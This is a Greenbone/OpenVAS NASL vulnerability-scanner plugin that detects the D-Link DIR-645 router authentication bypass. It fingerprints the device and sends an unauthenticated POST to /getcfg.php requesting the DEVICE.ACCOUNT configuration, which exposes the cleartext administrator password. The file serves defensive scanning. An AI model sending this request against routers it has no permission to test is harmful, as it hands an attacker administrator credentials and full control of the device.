if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803174" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-03-01 12:01:42 +0530 (Fri, 01 Mar 2013)" );
	script_name( "D-Link DIR-645 Router Authentication Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2013/Feb/150" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/120591" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "DIR-645/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to retrieve the administrator
  password and then access the device with full privileges. This will allow an
  attacker to launch further attacks." );
	script_tag( name: "affected", value: "D-Link DIR-645 firmware version prior to 1.03" );
	script_tag( name: "insight", value: "The web interface of D-Link DIR-645 routers expose several pages accessible
  with no authentication. These pages can be abused to access sensitive
  information concerning the device configuration, including the clear-text
  password for the administrative user." );
	script_tag( name: "solution", value: "Upgrade to D-Link DIR-645 firmware version 1.03 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "This host is running D-Link DIR-645 Router and is prone to
  authentication bypass vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.dlink.com/ca/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
host = http_host_name( port: port );
banner = http_get_remote_headers( port: port );
if(banner && !ContainsString( banner, "DIR-645" )){
	exit( 0 );
}
res = http_get_cache( item: "/", port: port );
if(ContainsString( res, ">D-LINK SYSTEMS" ) && ContainsString( res, ">DIR-645<" )){
	postdata = "SERVICES=DEVICE.ACCOUNT";
	req = NASLString( "POST /getcfg.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
	res = http_keepalive_send_recv( port: port, data: req );
	if(res && ContainsString( res, ">DEVICE.ACCOUNT<" ) && ContainsString( res, "name>DIR-645<" )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

